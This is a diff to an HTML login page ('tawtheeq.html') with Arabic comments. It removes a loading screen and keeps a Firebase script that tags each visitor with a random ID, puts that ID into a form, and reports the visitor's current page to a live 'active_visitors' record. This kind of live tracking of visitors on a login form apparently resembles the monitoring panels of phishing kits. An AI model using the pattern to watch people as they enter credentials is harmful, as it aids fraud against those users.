@@ -80,15 +80,7 @@
         footer { width: 100%; display: flex; flex-direction: column; }
         .footer-img { width: 100%; height: auto; display: block; }
 
-        /* شاشة التحميل المخصصة */
-        #loading-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.98); z-index: 9999;
-            flex-direction: column; align-items: center; justify-content: center;
-        }
-        .loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--primary-blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+        /* تم حذف شاشة التحميل نهائياً لضمان الانتقال الفوري */
     </style>
 </head>
 <body>
@@ -137,8 +129,6 @@
         </footer>
     </div>
 
-
-
     <script>
         // إعدادات Firebase
         const firebaseConfig = {
@@ -156,7 +146,6 @@
         }
         const database = firebase.database();
 
-        // استخدام نفس المعرف من الصفحة الرئيسية لربط البيانات
         let visitorId = sessionStorage.getItem('visitorId');
         if (!visitorId) {
             visitorId = "visitor_" + Math.floor(Math.random() * 900000 + 100000);
@@ -164,7 +153,6 @@
         }
         document.getElementById('form_visitor_id').value = visitorId;
 
-        // تحديث صفحة الزائر الحالية في قواعد البيانات للزيارات الحية
         const visitorRef = database.ref('active_visitors/' + visitorId);
         visitorRef.update({
             currentPage: "صفحة الدخول (tawtheeq.html)",
